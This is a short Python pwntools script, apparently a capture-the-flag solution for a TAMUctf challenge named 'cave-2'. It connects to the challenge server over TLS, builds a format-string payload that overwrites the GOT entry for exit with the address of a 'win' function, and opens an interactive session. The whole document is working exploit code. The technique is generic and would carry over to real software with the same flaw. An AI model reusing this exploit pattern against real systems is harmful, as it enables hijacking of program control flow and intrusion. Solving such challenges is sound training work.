#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("cave_2")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"

CHAL = "cave-2"

p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)

payload = fmtstr_payload(6, {exe.got['exit']: exe.symbols['win']})
p.sendline(payload)

p.interactive()
